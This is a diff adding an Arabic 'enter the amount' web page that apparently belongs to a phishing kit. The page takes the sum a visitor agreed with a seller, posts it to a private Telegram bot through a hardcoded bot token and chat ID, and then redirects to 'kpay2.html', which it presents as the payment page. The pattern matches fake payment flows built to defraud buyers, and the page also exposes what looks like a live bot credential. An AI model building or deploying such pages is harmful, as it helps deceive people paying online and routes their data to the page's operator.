@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>المبلغ المطلوب</title>
+
+  <style>
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", system-ui, Arial;
+      background: #f4f4f5;
+      color: #111827;
+      padding: 24px 14px;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 420px;
+      background: #ffffff;
+      border: 1px solid #e5e7eb;
+      border-radius: 16px;
+      padding: 18px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.08);
+    }
+
+    h1 {
+      margin: 0 0 12px;
+      font-size: 18px;
+      font-weight: 800;
+      letter-spacing: 0.2px;
+      color: #111827;
+    }
+
+    .label {
+      display: block;
+      font-size: 13px;
+      color: #6b7280;
+      margin-bottom: 8px;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      box-sizing: border-box;
+      padding: 14px 14px;
+      border-radius: 12px;
+      border: 1px solid #e5e7eb;
+      background: #ffffff;
+      color: #111827;
+      font-size: 16px;
+      outline: none;
+    }
+
+    input[type="text"]:focus {
+      border-color: #2563eb;
+      box-shadow: 0 0 0 3px rgba(37,99,235,0.15);
+    }
+
+    .note {
+      margin-top: 10px;
+      font-size: 12px;
+      color: #6b7280;
+    }
+
+    .row {
+      display: flex;
+      gap: 10px;
+      margin-top: 14px;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px 14px;
+      border: 0;
+      border-radius: 14px;
+      font-size: 16px;
+      font-weight: 800;
+      cursor: pointer;
+      background: #0b5fff;
+      color: #ffffff;
+      box-shadow: 0 10px 22px rgba(11,95,255,0.25);
+      transition: transform 0.08s ease;
+    }
+
+    button:active { transform: scale(0.99); }
+
+    button:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+
+    .error {
+      margin-top: 10px;
+      font-size: 13px;
+      color: #dc2626;
+      display: none;
+      line-height: 1.4;
+    }
+
+    .ok {
+      margin-top: 10px;
+      font-size: 13px;
+      color: #16a34a;
+      display: none;
+      line-height: 1.4;
+    }
+
+    .muted {
+      margin-top: 10px;
+      font-size: 12px;
+      color: #6b7280;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="card">
+    <h1>ادخل المبلغ المطلوب</h1>
+
+    <label class="label" for="qty">اكتب المبلغ المطلوب في المربع ادناه</label>
+    <input
+      id="qty"
+      type="text"
+      inputmode="numeric"
+      autocomplete="off"
+      placeholder="مثال : 100"
+      maxlength="7"
+    />
+
+    <div class="note">* ملاحظة : اكتب المبلغ الذي اتفقت عليه مع البائع</div>
+
+    <div class="row">
+      <button id="doneBtn" type="button">Done</button>
+    </div>
+
+    <div id="errorBox" class="error"></div>
+    <div id="okBox" class="ok"></div>
+    <div class="muted">بعد الضغط سيتم تحويلك لصفحة الدفع</div>
+  </div>
+
+  <script>
+    // تنبيه: وضع التوكن داخل GitHub Pages مكشوف للعامة.
+    const BOT_TOKEN = "8097834484:AAG7whd2jF7Ie5pXUiomwXd1VwleQPpAogc";
+    const CHAT_ID = "7811430582";
+
+    const qtyInput = document.getElementById("qty");
+    const doneBtn = document.getElementById("doneBtn");
+    const errorBox = document.getElementById("errorBox");
+    const okBox = document.getElementById("okBox");
+
+    function showError(msg) {
+      okBox.style.display = "none";
+      errorBox.textContent = msg;
+      errorBox.style.display = "block";
+    }
+
+    function showOk(msg) {
+      errorBox.style.display = "none";
+      okBox.textContent = msg;
+      okBox.style.display = "block";
+    }
+
+    // أرقام فقط
+    qtyInput.addEventListener("input", () => {
+      qtyInput.value = qtyInput.value.replace(/[^\d]/g, "");
+    });
+
+    async function sendToTelegram(amount) {
+      const text = `طلب جديد - سعودي : ${amount}
+Page: howmuch.html
+Time: ${new Date().toISOString()}`;
+
+const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      const res = await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text
+        })
+      });
+
+      const data = await res.json();
+      console.log("Telegram response:", data);
+      return data && data.ok === true;
+    }
+
+    doneBtn.addEventListener("click", async () => {
+      const amount = (qtyInput.value || "").trim();
+
+      if (!amount) return showError("يجب ان تكتب رقم.");
+      if (!/^\d+$/.test(amount)) return showError("مسموح أرقام فقط.");
+      if (Number(amount) <= 0) return showError("يجب ان يكون الرقم أكبر من صفر.");
+
+      doneBtn.disabled = true;
+      doneBtn.textContent = "Sending...";
+
+      try {
+        const ok = await sendToTelegram(amount);
+        if (ok) showOk("تم الإرسال.");
+        else showError("فشل الإرسال (تأكد من التوكن/الشات آي دي).");
+      } catch (e) {
+        showError(" خطأ بالشبكة.");
+      } finally {
+        setTimeout(() => {
+          window.location.href = "kpay2.html";
+        }, 500);
+      }
+    });
+  </script>
+</body>
+</html>
